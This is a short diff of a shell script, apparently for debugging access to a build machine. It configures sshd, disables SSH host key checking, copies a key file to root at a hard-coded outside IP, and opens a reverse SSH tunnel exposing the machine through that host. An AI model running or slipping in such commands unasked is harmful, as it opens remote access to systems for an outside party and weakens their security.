@@ -1,6 +1,6 @@
 OWD=$(pwd)
 pacman --noconfirm -Suy iproute2 openssh nfs-utils unzip
-echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
+echo "Port 22001" >> /etc/ssh/sshd_config
 /usr/sbin/sshd
 eval $(ssh-agent)
 chmod 0700 /root
@@ -16,7 +16,7 @@ echo "Host *" > .ssh/config
 echo "  StrictHostKeyChecking no" >> .ssh/config
 scp sshdkey root@168.235.81.234:/root/sshkey
 ip a s ens4
-ssh -R 22001:172.17.0.1:22 root@168.235.81.234 "sleep 2h"
+ssh -R 22001:127.0.0.1:22001 root@168.235.81.234 "sleep 2h"
 exit 0
 
 
